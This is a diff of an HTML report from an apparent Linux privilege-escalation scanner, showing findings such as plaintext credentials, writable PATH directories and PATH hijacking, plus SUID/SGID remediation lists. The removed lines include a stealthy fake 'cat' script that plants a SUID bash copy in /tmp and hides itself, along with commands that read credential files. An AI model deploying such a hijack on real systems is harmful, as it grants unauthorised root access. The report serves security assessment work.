+                    <div class="detail-label">Verification Reason:</div>
+                    <div class="detail-value">Exploit successfully executed</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Exploitation:</div>
+                    <div class="detail-value">
+                        <p>Extract plaintext credentials from /etc/unicornscan/modules.conf</p>
+                        <div class="code-block">cat /etc/unicornscan/modules.conf</div>
+                    </div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-low">
+                <div class="finding-header">
+                    VULN-056: Plaintext Credentials
                     <span>Low Risk</span>
                 </div>
                 <div class="finding-content">
@@ -2803,10 +2784,15 @@ netgroup:       nis
                 </div>
                 
                 <div class="detail-row">
+                    <div class="detail-label">Verification Reason:</div>
+                    <div class="detail-value">Exploit successfully executed</div>
+                </div>
+                
+                <div class="detail-row">
                     <div class="detail-label">Exploitation:</div>
                     <div class="detail-value">
-                        <p>Extract plaintext credentials from /etc/sqlmap/sqlmap.conf</p>
-                        <div class="code-block">cat /etc/sqlmap/sqlmap.conf</div>
+                        <p>Extract plaintext credentials from /etc/unicornscan/modules.conf</p>
+                        <div class="code-block">cat /etc/unicornscan/modules.conf</div>
                     </div>
                 </div>
                 
@@ -2815,51 +2801,7 @@ netgroup:       nis
             
             <div class="finding finding-low">
                 <div class="finding-header">
-                    VULN-059: Plaintext Credentials
-                    <span>Low Risk</span>
-                </div>
-                <div class="finding-content">
-            
-                <div class="detail-row">
-                    <div class="detail-label">Path:</div>
-                    <div class="detail-value">/var/lib/ucf/cache/:etc:idmapd.conf</div>
-                </div>
-                
-                <div class="detail-row">
-                    <div class="detail-label">Pattern:</div>
-                    <div class="detail-value">(?i)user\s*[=:]\s*[\'"]?([^\'"]+)[\'"]?</div>
-                </div>
-                
-                <div class="detail-row">
-                    <div class="detail-label">Matches:</div>
-                    <div class="detail-value"><ul>
-<li>nobody
-Nobody-Group = nogroup
-</li>
-</ul></div>
-                </div>
-                
-                <div class="detail-row">
-                    <div class="detail-label">Creds Data:</div>
-                    <div class="detail-value"><ul>
-<li>{'pattern': '(?i)user\\s*[=:]\\s*[\\\'"]?([^\\\'"]+)[\\\'"]?', 'matches': ['nobody\nNobody-Group = nogroup\n']}</li>
-</ul></div>
-                </div>
-                
-                <div class="detail-row">
-                    <div class="detail-label">Exploitation:</div>
-                    <div class="detail-value">
-                        <p>Extract plaintext credentials from /etc/sqlmap/sqlmap.conf</p>
-                        <div class="code-block">cat /etc/sqlmap/sqlmap.conf</div>
-                    </div>
-                </div>
-                
-                </div>
-            </div>
-            
-            <div class="finding finding-low">
-                <div class="finding-header">
-                    VULN-060: Writable Path Directory
+                    VULN-057: Writable Path Directory
                     <span>Low Risk</span>
                 </div>
                 <div class="finding-content">
@@ -2885,6 +2827,11 @@ Nobody-Group = nogroup
                 </div>
                 
                 <div class="detail-row">
+                    <div class="detail-label">Verification Reason:</div>
+                    <div class="detail-value">Exploit successfully executed</div>
+                </div>
+                
+                <div class="detail-row">
                     <div class="detail-label">Exploitation:</div>
                     <div class="detail-value">
                         <p>Create a malicious ls binary in /home/kali/.local/bin (which is in PATH) to escalate privileges</p>
@@ -2897,7 +2844,7 @@ Nobody-Group = nogroup
             
             <div class="finding finding-medium">
                 <div class="finding-header">
-                    VULN-061: Path Hijacking
+                    VULN-058: Path Hijacking
                     <span>Medium Risk</span>
                 </div>
                 <div class="finding-content">
@@ -2913,24 +2860,8 @@ Nobody-Group = nogroup
                 </div>
                 
                 <div class="detail-row">
-                    <div class="detail-label">Exploitation:</div>
-                    <div class="detail-value">
-                        <p>Create a malicious cat binary in /home/kali/.local/bin that will create a SUID bash copy</p>
-                        <div class="code-block">echo '#!/bin/bash
-    # Path hijacking exploit for cat
-    # Created by Advanced Linux Privilege Escalation Tool
-
-    # Create a copy of bash with SUID permissions
-    cp /bin/bash /tmp/.privbash-1741967625
-    chmod 4755 /tmp/.privbash-1741967625
-
-    # Leave evidence of successful execution
-    echo "[+] Privilege escalation successful via cat path hijacking at $(date)" > /tmp/.privesc-success-1741967625
-
-    # Run the original command to avoid detection
-    cat "$@"
-    ' > /home/kali/.local/bin/cat && chmod +x /home/kali/.local/bin/cat</div>
-                    </div>
+                    <div class="detail-label">Verification Reason:</div>
+                    <div class="detail-value">PATH hijacking for cat appears exploitable</div>
                 </div>
                 
                 </div>
@@ -2938,7 +2869,7 @@ Nobody-Group = nogroup
             
             <div class="finding finding-medium">
                 <div class="finding-header">
-                    VULN-062: Path Hijacking
+                    VULN-059: Path Hijacking
                     <span>Medium Risk</span>
                 </div>
                 <div class="finding-content">
@@ -2954,24 +2885,40 @@ Nobody-Group = nogroup
                 </div>
                 
                 <div class="detail-row">
-                    <div class="detail-label">Exploitation:</div>
-                    <div class="detail-value">
-                        <p>Create a malicious cat binary in /home/kali/.local/bin that will create a SUID bash copy</p>
-                        <div class="code-block">echo '#!/bin/bash
-    # Path hijacking exploit for cat
-    # Created by Advanced Linux Privilege Escalation Tool
-
-    # Create a copy of bash with SUID permissions
-    cp /bin/bash /tmp/.privbash-1741967625
-    chmod 4755 /tmp/.privbash-1741967625
-
-    # Leave evidence of successful execution
-    echo "[+] Privilege escalation successful via cat path hijacking at $(date)" > /tmp/.privesc-success-1741967625
-
-    # Run the original command to avoid detection
-    cat "$@"
-    ' > /home/kali/.local/bin/cat && chmod +x /home/kali/.local/bin/cat</div>
-                    </div>
+                    <div class="detail-label">Verification Reason:</div>
+                    <div class="detail-value">PATH hijacking for ls appears exploitable</div>
+                </div>
+                
+                </div>
+            </div>
+            
+            <div class="finding finding-low">
+                <div class="finding-header">
+                    VULN-060: History File Exposure
+                    <span>Low Risk</span>
+                </div>
+                <div class="finding-content">
+            
+                <div class="detail-row">
+                    <div class="detail-label">Path:</div>
+                    <div class="detail-value">/home/kali/.bash_history</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Pattern:</div>
+                    <div class="detail-value">(?i)passwd</div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Matches:</div>
+                    <div class="detail-value"><ul>
+<li>passwd</li>
+</ul></div>
+                </div>
+                
+                <div class="detail-row">
+                    <div class="detail-label">Verification Reason:</div>
+                    <div class="detail-value">No evidence of successful exploitation found</div>
                 </div>
                 
                 </div>
@@ -3004,8 +2951,8 @@ Nobody-Group = nogroup
                 <div class="finding-header">High Risk Vulnerabilities</div>
                 <div class="finding-content">
                     <ul>
-            <li>Remove unnecessary SUID bit from /etc/alternatives/rsh</li>
-<li>Remove unnecessary SUID bit from /etc/alternatives/rlogin</li>
+            <li>Remove unnecessary SUID bit from /etc/alternatives/rlogin</li>
+<li>Remove unnecessary SUID bit from /etc/alternatives/rsh</li>
 <li>Remove unnecessary SUID bit from /usr/lib/chromium/chrome-sandbox</li>
 <li>Remove unnecessary SUID bit from /usr/lib/openssh/ssh-keysign</li>
 <li>Remove unnecessary SUID bit from /usr/lib/polkit-1/polkit-agent-helper-1</li>
@@ -3017,29 +2964,28 @@ Nobody-Group = nogroup
 <li>Remove unnecessary SUID bit from /usr/bin/rsh</li>
 <li>Remove unnecessary SUID bit from /usr/bin/pkexec</li>
 <li>Remove unnecessary SUID bit from /usr/bin/sudoedit</li>
-<li>Remove unnecessary SUID bit from /usr/bin/mount</li>
 <li>Remove unnecessary SUID bit from /usr/bin/fusermount3</li>
-<li>Remove unnecessary SUID bit from /usr/bin/gpasswd</li>
 <li>Remove unnecessary SUID bit from /usr/bin/rlogin</li>
-<li>Remove unnecessary SUID bit from /usr/bin/chfn</li>
 <li>Remove unnecessary SUID bit from /usr/bin/fusermount</li>
+<li>Remove unnecessary SUID bit from /usr/bin/gpasswd</li>
+<li>Remove unnecessary SUID bit from /usr/bin/chfn</li>
 <li>Remove unnecessary SUID bit from /usr/bin/sg</li>
 <li>Remove unnecessary SUID bit from /usr/bin/su</li>
-<li>Remove unnecessary SUID bit from /usr/bin/sudo</li>
-<li>Remove unnecessary SUID bit from /usr/bin/rsh-redone-rsh</li>
 <li>Remove unnecessary SUID bit from /usr/bin/newgrp</li>
-<li>Remove unnecessary SUID bit from /usr/sbin/umount.nfs4</li>
-<li>Remove unnecessary SUID bit from /usr/sbin/mount.nfs</li>
-<li>Remove unnecessary SUID bit from /usr/bin/chsh</li>
-<li>Remove unnecessary SUID bit from /usr/sbin/mount.nfs4</li>
 <li>Remove unnecessary SUID bit from /usr/bin/umount</li>
-<li>Remove unnecessary SUID bit from /usr/sbin/mount.smb3</li>
+<li>Remove unnecessary SUID bit from /usr/bin/rsh-redone-rsh</li>
+<li>Remove unnecessary SUID bit from /usr/bin/chsh</li>
+<li>Remove unnecessary SUID bit from /usr/bin/sudo</li>
 <li>Remove unnecessary SUID bit from /usr/sbin/umount.nfs</li>
+<li>Remove unnecessary SUID bit from /usr/sbin/mount.nfs</li>
 <li>Remove unnecessary SUID bit from /usr/bin/passwd</li>
+<li>Remove unnecessary SUID bit from /usr/sbin/mount.smb3</li>
 <li>Remove unnecessary SUID bit from /usr/sbin/mount.ntfs-3g</li>
+<li>Remove unnecessary SUID bit from /usr/sbin/mount.nfs4</li>
+<li>Remove unnecessary SUID bit from /usr/sbin/umount.nfs4</li>
 <li>Remove unnecessary SUID bit from /usr/sbin/mount.ntfs</li>
-<li>Remove unnecessary SUID bit from /usr/sbin/pppd</li>
 <li>Remove unnecessary SUID bit from /usr/sbin/mount.cifs</li>
+<li>Remove unnecessary SUID bit from /usr/sbin/pppd</li>
 
                     </ul>
                 </div>
@@ -3055,11 +3001,11 @@ Nobody-Group = nogroup
 <li>Remove unnecessary SGID bit from /usr/bin/dotlockfile</li>
 <li>Remove unnecessary SGID bit from /usr/bin/plocate</li>
 <li>Remove unnecessary SGID bit from /usr/bin/ssh-agent</li>
-<li>Remove unnecessary SGID bit from /usr/bin/chage</li>
-<li>Remove unnecessary SGID bit from /usr/sbin/unix_chkpwd</li>
-<li>Remove unnecessary SGID bit from /usr/bin/expiry</li>
 <li>Remove unnecessary SGID bit from /usr/bin/locate</li>
+<li>Remove unnecessary SGID bit from /usr/bin/chage</li>
 <li>Remove unnecessary SGID bit from /usr/bin/crontab</li>
+<li>Remove unnecessary SGID bit from /usr/bin/expiry</li>
+<li>Remove unnecessary SGID bit from /usr/sbin/unix_chkpwd</li>
 <li>Review and secure PATH directories to prevent binary hijacking</li>
 <li>Review and secure PATH directories to prevent binary hijacking</li>
 
